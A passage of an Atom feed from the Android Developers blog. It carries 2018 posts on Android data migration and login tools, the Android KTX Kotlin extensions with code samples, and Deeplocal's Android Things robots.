    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7046069072725143287"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7046069072725143287"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/U_IsOJgAf34/congratulations-to-winners-of-google.html" title=" Congratulations to the winners of the Google Play Indie Games Contest  2017 in Europe"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-wywvvr3ZL7I/WoNka2jPy5I/AAAAAAAAFC0/F07g1ciL-No_Nv9G8D1YVw8bbXfg47gugCLcBGAs/s72-c/1.jpg" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/02/congratulations-to-winners-of-google.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-673389876337546677</id>
    <published>2018-02-12T11:30:00.000-08:00</published>
    <updated>2018-02-12T12:33:22.117-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="android developers"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Auto Backup"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Autofill Framework"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Play"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Sign-In"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Smartlock"/>
    <title type="text">Discover tools for Android data migration and improve your app retention</title>
    <content type="html">&lt;meta name="twitter:image" content="https://2.bp.blogspot.com/-Mj8BBsILDG4/WoHkIsKJ75I/AAAAAAAAFCk/pkWfs-AW0U0jCCqSCMZUn0R4LMr8k_n8gCLcBGAs/s1600/Screen%2BShot%2B2018-02-12%2Bat%2B10.58.10%2BAM.png"&gt;

&lt;em&gt;Posted by Sean McQuillan (@objcode) and Prateek Tandon (@ptandon05)&lt;/em&gt;
&lt;p&gt;
What happens to app usage and accessibility when people get new phones? The feedback we've had is that people want apps to work straight out of the box, just like on their old phones.
&lt;/p&gt;
&lt;p&gt;
Developers of successful apps might also be used to thinking about user activation in a model borrowed straight from web. On the web, people register new accounts, activate by finding great features, then become retained when they experience value, and come back repeatedly to use your web page.
&lt;/p&gt;
&lt;p&gt;
The story is much the same on mobile. People register to create new accounts, activate by using your great features, then become retained when they find value and repeatedly launch your app. However, there's one big difference. Android apps typically store more information compared to your average web session. You usually never have to re-enter your password for an Android app for years, post account creation, that is until the moment you get a new phone.
&lt;/p&gt;
&lt;p&gt;
Getting a new phone can be a rare event for many people - some going years between upgrading devices. However, overall a large proportion of those who use your app will get a new phone every year. We have several tools to help you keep people logged in, engaged, and happy when they use your app on a new phone.
&lt;/p&gt;
&lt;h3&gt;Back up your app data&lt;/h3&gt;


&lt;p&gt;
&lt;a href="https://developer.android.com/guide/topics/data/autobackup.html"&gt;Auto Backup for apps&lt;/a&gt; should be configured for every application. This feature does exactly what it says - automatically backs up your app data. So when people get a new phone, their app data is automatically restored before your app launches. 
&lt;/p&gt;
&lt;p&gt;
To configure Auto Backup for your app you need to setup include/exclude rules:
&lt;/p&gt;
&lt;p&gt;
AndroidManifest.xml
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;&amp;lt;application ...
    android:fullBackupContent="@xml/autobackup"&gt;
&lt;/pre&gt;


&lt;p&gt;
xml/autobackup.xml
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;&amp;lt;?xml version="1.0" encoding="utf-8"?&gt;
&amp;lt;full-backup-content&gt;
    &amp;lt;include domain="sharedpref" path="."/&gt;
    &amp;lt;exclude domain="sharedpref" path="device.xml"/&gt;
&amp;lt;/full-backup-content&gt;
&lt;/pre&gt;


&lt;p&gt;
When configuring include/exclude rules it's important to avoid storing sensitive user data in Auto Backup, although it's a great place to store user specific settings and other app content! 
&lt;/p&gt;
&lt;p&gt;
To implement tracking for Auto Backup register a &lt;a href="https://developer.android.com/reference/android/app/backup/BackupAgent.html"&gt;BackupAgent&lt;/a&gt; and listen for &lt;a href="https://developer.android.com/reference/android/app/backup/BackupAgent.html#onQuotaExceeded(long, long)"&gt;onQuotaExceeded(long, long)&lt;/a&gt; callback. If your app exceeds the 25MB backup limit, this callback will be your notification of failure. In a well configured app this will never happen, so you can track it as a crash report.
&lt;/p&gt;
&lt;p&gt;
&lt;a href="https://developer.android.com/guide/topics/data/autobackup.html"&gt;Learn more about Auto Backup for apps&lt;/a&gt;.
&lt;/p&gt;
&lt;h3&gt;Optimize log-in&lt;/h3&gt;


&lt;p&gt;
When we talk to people about the experiences they want on their new phones they're very clear; they want your app to remember who they are, and they don't want to re-enter a password. There are several ways you can accomplish this as a developer:
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;Use Google Sign-In to make login frictionless.&lt;/strong&gt; People can sign in with their Gmail account, or any email address. Most importantly, they don't need to remember a password. On top of improving registration and activation, enabling Google Sign-In will also help with retention as it allows those getting new phones to reactivate with a single button, or even automatically. Even better, you can use Google Sign-In for the same login experience for your iOS, Web, and Android applications. This seamless experience is also available if your app uses Firebase Auth to handle Google Sign-In.&lt;/li&gt;&lt;/ul&gt;
&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;Make things simpler by using Google Smart Lock and Autofill.&lt;/strong&gt; These two features work hand in hand to help people safely access their passwords. Autofill was introduced in Android O, and will offer to save your app user's passwords to the Smart Lock datastore, or their preferred password manager, automatically when they log in. To prepare your app, setup Autofill hints, and exclude fields that should not be filled by the Autofill framework.&lt;/li&gt;&lt;/ul&gt;

&lt;pre class="prettyprint"&gt;
&amp;lt;TextView
&lt;p&gt;
   android:id="@+id/username"
   android:layout_width="wrap_content"
   android:layout_height="wrap_content"
   android:autofillHints="username" /&gt;
&lt;/p&gt;
&amp;lt;TextView

   android:id="@+id/password"
   android:layout_width="wrap_content"
   android:layout_height="wrap_content"
   android:autofillHints="password" /&gt;
&lt;/p&gt;
&amp;lt;TextView

   android:id="@+id/captcha"
   android:layout_width="wrap_content"
   android:layout_height="wrap_content"
   android:importantForAutofill="no" /&gt;
&lt;/p&gt;&lt;ul&gt;&lt;/pre&gt;

&lt;li&gt;&lt;strong&gt;Integrate the Smart Lock for Passwords API to safely store passwords.&lt;/strong&gt; It's backwards compatible to API 9 and works great on devices with older versions of Android that don't work with Autofill. Similar to Autofill, Smart Lock API will offer a dialog to save people's passwords after they log in. But even better - it enables programmatic retrieval for automatic return to user sign-in, even across new devices and in Chrome. To support this Smart Lock functionality you will need to include some code in your app; check out the &lt;a href="https://codelabs.developers.google.com/codelabs/android-smart-lock/"&gt;Codelab&lt;/a&gt; to learn how to integrate Smart Lock for Passwords to your app. Also, be sure to &lt;a href="https://developers.google.com/identity/smartlock-passwords/android/associate-apps-and-sites"&gt;link your app and website&lt;/a&gt;, for a smooth experience across Chrome and Android with Autofill and Smart Lock.&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;Consider using the Account Transfer API so your app can transfer credentials from an old phone to a new one&lt;/strong&gt;. It does this using an encrypted bluetooth/cable, and you can transfer data from phones running API 14 or higher. Account transfer happens when your app user is setting up their new phone for the first time, though your app doesn't need to be installed from the Google Play Store. When your app re-installs from Google Play, the credentials will be available to your app on first launch. &lt;a href="https://www.youtube.com/watch?v=Gtp2oHGBqNY"&gt;Watch more best practices to get started with the Account Transfer API&lt;/a&gt;, and &lt;a href="https://developer.android.com/guide/topics/data/account-transfer.html"&gt;read the API guide for Account Transfer&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;

&lt;h3&gt;Codelabs&lt;/h3&gt;


&lt;p&gt;
If you haven't already, try the &lt;a href="https://codelabs.developers.google.com/codelabs/android-backup-codelab/index.html"&gt;Auto Backup for Android Codelab&lt;/a&gt;, and &lt;a href="https://codelabs.developers.google.com/codelabs/android-smart-lock/#0"&gt;SmartLock Codelab&lt;/a&gt;. 
&lt;/p&gt;
&lt;p&gt;
Improving retention on Android for many people will involve trying to overcome the friction of device switches. With a rich toolbox at your disposal to transfer settings with Auto Backup, and to improve the login experience with &lt;a href="https://developers.google.com/identity/sign-in/android/"&gt;Google Sign-In&lt;/a&gt;, &lt;a href="https://developers.google.com/identity/smartlock-passwords/android/"&gt;Smart Lock for Passwords&lt;/a&gt;, &lt;a href="https://developer.android.com/guide/topics/text/autofill.html"&gt;Autofill&lt;/a&gt;, and &lt;a href="https://developer.android.com/guide/topics/data/account-transfer.html"&gt;Account Transfer API&lt;/a&gt;, you have the opportunity to  deliver a great user story: your app works on people's new phones, just like it did on their old phones.
&lt;/p&gt;
&lt;center&gt;&lt;p&gt;
 How useful did you find this blogpost? 
&lt;/p&gt;
&lt;p&gt;
&lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=1%E2%98%85+%E2%80%93+Not+at+all&amp;entry.2056663615&amp;entry.646747778=Androiddatamigration-02/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=2%E2%98%85+%E2%80%93+Not+very&amp;entry.2056663615&amp;entry.646747778=Androiddatamigration-02/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=3%E2%98%85+%E2%80%93+Somewhat&amp;entry.2056663615&amp;entry.646747778=Androiddatamigration-02/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=4%E2%98%85+%E2%80%93+Very&amp;entry.2056663615&amp;entry.646747778=Androiddatamigration-02/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=5%E2%98%85+%E2%80%93+Extremely&amp;entry.2056663615&amp;entry.646747778=Androiddatamigration-02/18"&gt;★&lt;/a&gt;
&lt;/p&gt;&lt;/center&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=hHZJDgjebN8:HXmbAgoaS1U:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=hHZJDgjebN8:HXmbAgoaS1U:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=hHZJDgjebN8:HXmbAgoaS1U:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/hHZJDgjebN8" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/673389876337546677"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/673389876337546677"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/hHZJDgjebN8/discover-tools-for-android-data.html" title="Discover tools for Android data migration and improve your app retention"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/02/discover-tools-for-android-data.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-2515897522667751093</id>
    <published>2018-02-05T10:08:00.002-08:00</published>
    <updated>2018-02-06T10:24:08.565-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="API"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Kotlin"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="ktx"/>
    <title type="text">Introducing Android KTX: Even Sweeter Kotlin Development for Android</title>
    <content type="html">&lt;meta name="twitter:image" content="https://4.bp.blogspot.com/-ZSmPFAwGpi8/Wni5bkZ0u5I/AAAAAAAAFCU/XhXw6-EzpGkROWxtEzS8p819JfwPm2QxgCLcBGAs/s1600/maxresdefault%2B%252836%2529.jpg"&gt;

&lt;em&gt;Posted by  Jake Wharton (&lt;a href="https://twitter.com/jakewharton"&gt;@JakeWharton&lt;/a&gt;), Florina Muntenescu (&lt;a href="https://twitter.com/FMuntenescu"&gt;@FMuntenescu&lt;/a&gt;) &amp; James Lau (&lt;a href="https://twitter.com/jmslau"&gt;@jmslau&lt;/a&gt;)&lt;/em&gt;

&lt;p&gt;
Today, we are announcing the preview of Android KTX - a set of extensions designed to make writing Kotlin code for Android more concise, idiomatic, and pleasant. Android KTX provides a nice API layer on top of both Android framework and Support Library to make writing your Kotlin code more natural. 
&lt;/p&gt;
&lt;p&gt;
The portion of Android KTX that covers the Android framework is now available in our &lt;a href="https://github.com/android/android-ktx/"&gt;GitHub repo&lt;/a&gt;. We invite you to try it out to give us your feedback and contributions. The other parts of Android KTX that cover the Android Support Library will be available in upcoming Support Library releases. 
&lt;/p&gt;

&lt;center&gt;&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/kmvS3sZF_y0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;






&lt;p&gt;
Let's take a look at some examples of how Android KTX can help you write more natural and concise Kotlin code. 
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Code Samples Using Android KTX&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;em&gt;&lt;span style="text-decoration:underline;"&gt;String to Uri&lt;/span&gt;&lt;/em&gt;
&lt;/p&gt;
&lt;p&gt;
Let's start with this simple example. Normally, you'd call &lt;code&gt;Uri.parse(uriString)&lt;/code&gt;. Android KTX adds an extension function to the String class that allows you to convert strings to URIs more naturally.
&lt;/p&gt;

&lt;div class="ktx"&gt;
&lt;table&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;center&gt;&lt;strong&gt;Kotlin&lt;/strong&gt;&lt;/center&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;center&gt;&lt;strong&gt;Kotlin with Android KTX&lt;/strong&gt;&lt;/center&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;strong&gt;&lt;pre class="prettyprint"&gt;&lt;strong style="color:#008"&gt;val&lt;/strong&gt; uri = Uri.parse(myUriString)&lt;/pre&gt;&lt;/strong&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;strong&gt;&lt;pre class="prettyprint"&gt;&lt;span class="val"&gt;val&lt;/span&gt; uri = myUriString.&lt;em&gt;toUri&lt;/em&gt;()&lt;/pre&gt;&lt;/strong&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;


&lt;p&gt;
&lt;em&gt;&lt;span style="text-decoration:underline;"&gt;Edit SharedPreferences&lt;/span&gt;&lt;/em&gt;
&lt;/p&gt;
&lt;p&gt;
Editing SharedPreferences is a very common use case. The code using Android KTX is slightly shorter and more natural to read and write.
&lt;/p&gt;

&lt;div class="ktx"&gt;
&lt;table&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;center&gt;&lt;strong&gt;Kotlin&lt;/strong&gt;&lt;/center&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;center&gt;&lt;strong&gt;Kotlin with Android KTX&lt;/strong&gt;&lt;/center&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;pre class="prettyprint"&gt;sharedPreferences.edit()
           .putBoolean(key, value)
           .apply()
&lt;/pre&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;pre class="prettyprint"&gt;sharedPreferences.edit { 
    putBoolean(key, value) 
}
&lt;/div&gt;
 
&lt;div class="ktx"&gt;
&lt;/pre&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;em&gt;&lt;span style="text-decoration:underline;"&gt;Translating path difference&lt;/span&gt;&lt;/em&gt;
&lt;/p&gt;
&lt;p&gt;
In the code below, we translate the difference between two paths by 100px. 
&lt;/p&gt;

&lt;div class="ktx"&gt;
&lt;table&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;center&gt;&lt;strong&gt;Kotlin&lt;/strong&gt;&lt;/center&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;center&gt;&lt;strong&gt;Kotlin with Android KTX&lt;/strong&gt;&lt;/center&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;pre class="prettyprint"&gt;&lt;span class="val"&gt;val&lt;/span&gt; pathDifference = Path(myPath1).apply {
   op(myPath2, Path.Op.DIFFERENCE)
}

&lt;span class="val"&gt;val&lt;/span&gt; myPaint = Paint()

canvas.apply {
   &lt;span class="val"&gt;val&lt;/span&gt; checkpoint = save()
   translate(0F, 100F)
   drawPath(pathDifference, myPaint)
   restoreToCount(checkpoint)
}


&lt;/pre&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;pre class="prettyprint"&gt;&lt;span class="val"&gt;val&lt;/span&gt; pathDifference = myPath1 - myPath2

canvas.withTranslation(y = 100F) {
   drawPath(pathDifference, myPaint)
}

&lt;/pre&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;em&gt;&lt;span style="text-decoration:underline;"&gt;Action on View onPreDraw&lt;/span&gt;&lt;/em&gt;
&lt;/p&gt;
&lt;p&gt;
This example triggers an action with a View's onPreDraw callback. Without Android KTX, there is quite a bit of code you need to write. 
&lt;/p&gt;

&lt;div class="ktx"&gt;
&lt;table&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;center&gt;&lt;strong&gt;Kotlin&lt;/strong&gt;&lt;/center&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;pre class="prettyprint"&gt;view.&lt;em&gt;viewTreeObserver&lt;/em&gt;.addOnPreDrawListener(
       &lt;strong&gt;object &lt;/strong&gt;: ViewTreeObserver.OnPreDrawListener {
           &lt;strong&gt;override fun &lt;/strong&gt;onPreDraw(): Boolean {
               viewTreeObserver.removeOnPreDrawListener(&lt;strong&gt;this&lt;/strong&gt;)
               actionToBeTriggered()
               &lt;strong&gt;return true&lt;/strong&gt;
&lt;strong&gt;           }&lt;/strong&gt;
       })&lt;/pre&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;center&gt;&lt;strong&gt;Kotlin with Android KTX&lt;/strong&gt;&lt;/center&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;pre class="prettyprint"&gt;view.&lt;em&gt;doOnPreDraw &lt;strong&gt;{ &lt;/strong&gt;&lt;/em&gt;actionToBeTriggered() &lt;strong&gt;}&lt;/strong&gt;&lt;/pre&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;
There are many more places where Android KTX can simplify your code. You can read the &lt;a href="https://android.github.io/android-ktx/core-ktx/"&gt;full API reference documentation&lt;/a&gt; on GitHub.
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;&lt;em&gt;Getting Started&lt;/em&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
To start using Android KTX in your Android Kotlin projects, add the following to your app module's &lt;code&gt;build.gradle&lt;/code&gt; file:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;repositories {
    google()
}

dependencies {
    // Android KTX for framework API
    implementation 'androidx.core:core-ktx:0.1'
    ...
}
&lt;/pre&gt;


&lt;p&gt;
Then, after you sync your project, the extensions appear automatically in the IDE's auto-complete list. Selecting an extension automatically adds the necessary import statement to your file.
&lt;/p&gt;
&lt;p&gt;
Beware that the APIs are likely to change during the preview period. If you decide to use it in your projects, you should expect breaking changes before we reach the stable version.
&lt;/p&gt;


&lt;h3&gt;androidx: Hello World!
&lt;/h3&gt;


&lt;p&gt;
You may notice that Android KTX uses package names that begin with &lt;strong&gt;&lt;code&gt;androidx&lt;/code&gt;&lt;/strong&gt;. This is a new package name prefix that we will be using in future versions of Android Support Library. We hope the division between &lt;code&gt;android.*&lt;/code&gt; and &lt;code&gt;androidx.*&lt;/code&gt; makes it more obvious which APIs are bundled with the platform, and which are static libraries for app developers that work across different versions of Android.

&lt;p&gt;
&lt;h3&gt;&lt;em&gt;What's Next?&lt;/em&gt;&lt;/h3&gt;
&lt;/p&gt;
&lt;p&gt;
Today's preview launch is only the beginning. Over the next few months, we will iterate on the API as we incorporate your &lt;a href="https://github.com/android/android-ktx#how-to-contribute"&gt;feedback and contributions&lt;/a&gt;. When the API has stabilized and we can commit to API compatibility, we plan to release Android KTX as part of the Android Support Library.
&lt;/p&gt;
&lt;p&gt;
We look forward to building Android KTX together with you. Happy Kotlin-ing!
&lt;/p&gt;



&lt;style&gt; 

table, td {
border: 1px solid black;
border-collapse: collapse;
background-color: #f7f7f7;
}

table {
width: 100%;
table-layout: fixed;
}

td {
width: 50%;
padding: 1%;
}

.ktx {
width: 100%;
}

.val {
color: #008 !important;
font-weight: bold;
}

pre, .post-content pre.prettyprint {
border: none;
overflow: hidden;
}


&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=Jt_LI2GUqj8:qZJZRFWkdUo:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=Jt_LI2GUqj8:qZJZRFWkdUo:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=Jt_LI2GUqj8:qZJZRFWkdUo:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/Jt_LI2GUqj8" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/2515897522667751093"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/2515897522667751093"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/Jt_LI2GUqj8/introducing-android-ktx-even-sweeter.html" title="Introducing Android KTX: Even Sweeter Kotlin Development for Android"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/02/introducing-android-ktx-even-sweeter.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-33342093765767962</id>
    <published>2018-02-01T10:00:00.000-08:00</published>
    <updated>2018-02-01T10:00:53.476-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="deeplocal"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="internet"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="IoT"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="learning"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="machine"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="of"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="robotics"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="things"/>
    <title type="text">IoT Developer Story: Deeplocal </title>
    <content type="html">&lt;em&gt;Posted by &lt;a href="https://google.com/+DaveSmithDev"&gt;Dave Smith&lt;/a&gt;, Developer Advocate for IoT&lt;/em&gt;

&lt;p&gt;
&lt;a href="http://deeplocal.com/"&gt;Deeplocal&lt;/a&gt; is a Pittsburgh-based innovation studio that makes inventions as marketing to help the world's most loved brands tell their stories. The team at Deeplocal built several fun and engaging robotics projects using &lt;a href="https://developer.android.com/things/index.html"&gt;Android Things&lt;/a&gt;. Leveraging the developer ecosystem surrounding the Android platform and the compute power of Android Things &lt;a href="https://developer.android.com/things/hardware/index.html"&gt;hardware&lt;/a&gt;, they were able to quickly and easily create robots powered by computer vision and machine learning.
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;DrawBot&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
DrawBot is a DIY drawing robot that transforms your selfies into physical works of art.
&lt;/p&gt;

&lt;center&gt;&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/QIZqzfLmn8g" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;

&lt;p&gt;
"&lt;em&gt;The Android Things platform helped us move quickly from an idea, to prototype, to final product. Switching from phone apps to embedded code was easy in Android Studio, and we were able to pull in OpenCV modules, motor drivers, and other libraries as needed. The final version of our prototype was created two weeks after unboxing our first Android Things developer kit.&lt;/em&gt;"
&lt;/p&gt;
&lt;p&gt;
- &lt;strong&gt;Brian Bourgeois, Producer, Deeplocal&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
Want to build your own DrawBot? See the &lt;a href="https://www.hackster.io/57970/android-things-drawbot-9cdb1d"&gt;Hackster.io project&lt;/a&gt; for all the source code, schematics, and 3D models.
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;HandBot&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
A robotic hand that learns and reacts to hand gestures, HandBot visually recognizes gestures and applies machine learning.
&lt;/p&gt;

&lt;center&gt;&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/96Qsiz0ik4o" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;

&lt;p&gt;
&lt;em&gt;"The Android Things platform made integration work for Handbot a breeze. Using TensorFlow, we were able to train a neural network to recognize hand gestures. Once this was created, we were able to use Android Things drivers to implement games in easy-to-read Android code. In a matter of weeks, we went from a fresh developer kit to competing against a robot hand in Rock, Paper, Scissors."&lt;/em&gt;
&lt;/p&gt;
&lt;p&gt;
- &lt;strong&gt;Mike Derrick, Software Engineer, Deeplocal&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
Want to build your own HandBot? See the &lt;a href="https://www.hackster.io/67368/android-things-handbot-513eb6"&gt;Hackster.io project&lt;/a&gt; for all the source code, schematics, and 3D models.
&lt;/p&gt;
&lt;p&gt;
Visit the &lt;a href="https://www.hackster.io/google/products/android-things?sort=trending"&gt;Google Hackster community&lt;/a&gt; to explore more inspiring ideas just like these, and join &lt;a href="https://g.co/iotdev"&gt;Google's IoT Developers Community&lt;/a&gt; on Google+ to get the latest platform updates, ask questions, and discuss ideas.
&lt;/p&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=dBazV776NM0:0CA11ocv1eo:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=dBazV776NM0:0CA11ocv1eo:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=dBazV776NM0:0CA11ocv1eo:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/dBazV776NM0" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/33342093765767962"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/33342093765767962"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/dBazV776NM0/iot-developer-story-deeplocal.html" title="IoT Developer Story: Deeplocal "/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
